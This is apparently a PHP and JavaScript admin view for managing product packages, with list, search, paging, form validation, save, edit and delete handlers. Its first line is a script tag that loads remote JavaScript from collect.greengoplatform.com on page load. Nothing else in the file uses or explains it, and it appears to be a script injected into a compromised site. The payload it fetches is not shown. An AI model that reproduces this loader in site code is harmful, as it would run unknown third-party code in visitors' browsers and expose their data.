<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>
<?php $data[$this->pages]=$this->paket;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->paket,$baseView,$this->modalFullScreen); ?>



<script>

    var urlLocal    = `${strMasterData}/${strPaket}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strNama);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    var tag;
    var isSoftware=false;
    var getAllProduct=[];

    $(document).ready(function() {
        loadData(1);
        getAllTag(urlLocal,function(res){
            var arr = res;
            var unique = [...new Set(arr)];
            tag = setTags(".tag",unique);
        });
        var arrSelect = [strKategori];
        arrSelect.forEach(function(row){
            setSelect(base_url+`${strMasterData}/${row}/${strGetAll}`,row,function(res){
                loadModel(res[0].id);
            },false);
        });
    });

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }
    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }
    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }

    formInput.validate({
        rules: {
            nama: {required: true,remote: {url: base_url+urlLocal+ `check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
            deskripsi:{required:true},
            kategori:{required:true},
            harga:{required:true,currency: ["ID", false]},
            harga_coret:{currency: ["ID", false]},
            varian:{required:true},
            "file_upload[]":{required:true}
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            console.log(isSoftware);
            var myForm = document.getElementById(strFormInput);
            ajaxFile(base_url+urlLocal+urlSave,new FormData(myForm),function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName) anyPage.val("");
                        loadData(page,false);
                        notif(strSuccess);
                        modalForm.modal(strHide);
                        delForm(formInput);
                        paramForm.val(strAdd);
                    })
                } else {
                    notif(strFailed);
                }
            });
        }
    });
    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                setFocus(strNama);
                var data        = res.res_data;
                var dataId      = [strNama,strId,strHarga,strHargaCoret,strDeskripsi,strKategori,strStatus];
                dataId.forEach(function(res){
                    timeOut(function(){res===strHarga?isMoney(strHarga):isMoney(strHargaCoret);});
                    setIdSelect(res,data[res]);
                });
                setFileImage(data[strGambar],strPaket);
                loadModel(data[strKategori]);
                setTimeout(function(){
                    setValueSelect(strModel, JSON.parse(data[strModel]));
                },300);
                setTagify(tag,data[strVarian]);
                getAllProduct = JSON.parse(data[strModel])
            } else {
                notif(strError);
            }
        });
    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        delImage();
        delValueSelect(strProduk);
        delTagify(tag);
    });

    function loadModel(id){
        setSelect(base_url+`${strMasterData}/${strModel}/${strGetAll}/${id}`,strModel);
    }



    attrId(strKategori).on('change',function(){checkIsSoftware();});

    function checkIsSoftware(){
        timeOut(function(){
            var name=attrId(strKategori).children(':selected').text().toLowerCase();
            isSoftware=name.includes("software & hardware");
            if(isSoftware){
                loadModel("");
            }
            else{
                loadModel(attrId(strKategori).val());
            }
        })
    }


</script>